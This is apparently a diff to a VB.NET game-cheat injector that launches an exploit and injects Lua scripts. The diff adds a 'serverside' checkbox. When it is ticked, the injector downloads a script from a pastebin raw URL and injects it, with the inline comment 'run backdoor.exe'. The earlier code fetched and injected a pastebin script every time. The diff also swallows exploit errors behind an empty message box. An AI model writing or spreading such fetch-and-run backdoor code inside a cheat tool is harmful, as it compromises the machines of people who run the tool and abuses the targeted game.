@@ -41,7 +41,12 @@ Public Class Form1
 
     Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
         InjTest.Start()
-        hax.LaunchExploit()
+        Try
+            hax.LaunchExploit()
+        Catch ex As Exception
+            MsgBox("")
+        End Try
+
     End Sub
 
     Private Sub FastColoredTextBox1_Load(sender As Object, e As EventArgs) Handles FastColoredTextBox1.Load
@@ -79,6 +84,11 @@ Public Class Form1
 
     Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
         ListBox1.Items.Clear() 'Clear Items In the LuaScriptList
+        If My.Settings.serverside = True Then
+            CheckBox1.Checked = True
+        Else
+            CheckBox1.Checked = False
+        End If
         Functions.PopulateListBox(ListBox1, "./Scripts", "*.txt") ';
         Functions.PopulateListBox(ListBox1, "./Scripts", "*.lua") ';
     End Sub
@@ -172,9 +182,11 @@ Public Class Form1
 
     Private Sub InjTest_Tick(sender As Object, e As EventArgs) Handles InjTest.Tick
         If hax.isAPIAttached = True Then
-            Dim wb As WebClient = New WebClient()
-            Dim Script As String = wb.DownloadString("https://pastebin.com/raw/6M4GpD10")
-            hax.SendLuaScript(Script)
+            If CheckBox1.Checked = True Then
+                Dim wb As WebClient = New WebClient()
+                Dim Script As String = wb.DownloadString("https://pastebin.com/raw/uDsSNXNb") 'run backdoor.exe
+                hax.SendLuaScript(Script)
+            End If
             Label3.Text = "injected"
             InjTest2.Start()
             InjTest.Stop()
@@ -201,6 +213,15 @@ Public Class Form1
             Label3.Text = "not injected"
             InjTest.Start()
             InjTest2.Stop()
+        End If
+    End Sub
+
+    Private Sub CheckBox1_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox1.CheckedChanged
+        If CheckBox1.Checked = True Then
+            My.Settings.serverside = True
+
+        Else
+            My.Settings.serverside = False
         End If
     End Sub
 End Class
